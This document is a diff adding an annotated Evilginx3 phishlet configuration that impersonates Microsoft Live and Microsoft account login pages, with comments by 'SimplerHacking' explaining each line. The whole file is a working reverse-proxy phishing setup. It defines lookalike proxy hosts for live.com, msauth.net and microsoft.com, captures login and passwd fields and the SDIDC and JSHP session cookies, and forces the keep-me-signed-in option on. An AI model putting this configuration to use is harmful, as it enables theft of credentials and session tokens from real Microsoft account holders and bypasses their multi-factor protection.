@@ -1,0 +1,62 @@
+# Microsoft Live Phishlet configuration for Evilginx3
+
+# I got a request for a more granular breakdown of each line
+# Much easier to understand this way in the flow 
+
+name: 'Microsoft Live'
+author: 'SimplerHacking'
+min_ver: '3.0.0'
+
+# Proxy hosts configurations: Each entry defines how traffic is routed and handled.
+proxy_hosts:
+  # Phishing subdomain for live.com login page.
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'live.com', session: true, is_landing: true, auto_filter: true}
+  # CDN proxy for Microsoft authentication network.
+  - {phish_sub: 'cdn', orig_sub: 'logincdn', domain: 'msauth.net', session: true, is_landing: false, auto_filter: true}
+  # Account management page for live.com.
+  - {phish_sub: 'account', orig_sub: 'account', domain: 'live.com', session: true, is_landing: false, auto_filter: true}  
+  # General Microsoft account access via microsoft.com.
+  - {phish_sub: 'microsoft', orig_sub: 'account', domain: 'microsoft.com', session: false, is_landing: false, auto_filter: true}
+  # Microsoft Online login, typically for business accounts.
+  - {phish_sub: 'login.microsoftonline', orig_sub: 'login', domain: 'microsoftonline.com', session: false, is_landing: false, auto_filter: true}
+  # Access to Microsoft’s main site, useful for comprehensive phishing.
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'microsoft.com', session: true, is_landing: false, auto_filter: true} 
+
+# Authentication tokens configurations: Capturing and handling session cookies.
+auth_tokens:
+  # Targeting login.live.com (trigger)
+  - domain: '.login.live.com'
+    keys: ['SDIDC','JSHP']
+    type: 'cookie'
+
+# Credentials configurations: Defining how to extract user credentials.
+credentials:
+  # Capturing username from the login form.
+  username:
+    key: 'login'
+    search: '(.*)'
+    type: 'post'
+  # Capturing password from the login form.
+  password:
+    key: 'passwd'
+    search: '(.*)'
+    type: 'post'
+
+# Force POST request configurations: Manipulating form submissions.
+force_post:
+  # Intercepting and modifying POST data on the login.srf path.
+  - path: '/ppsecure/post.srf'
+    search:
+      - {key: 'login', search: '.*'}
+      - {key: 'passwd', search: '.*'}
+    force:
+      - {key: 'KMSI', value: 'on'}
+    type: 'post' 
+
+# Login page configuration: Defining the entry point for phishing.
+login:
+  # Setting the login domain and path for initial phishing page.
+  domain: 'login.live.com'
+  path: 'login.srf'
+
+# Learn to make your own phishlets from scratch similar to this one at www.simplerhacking.com
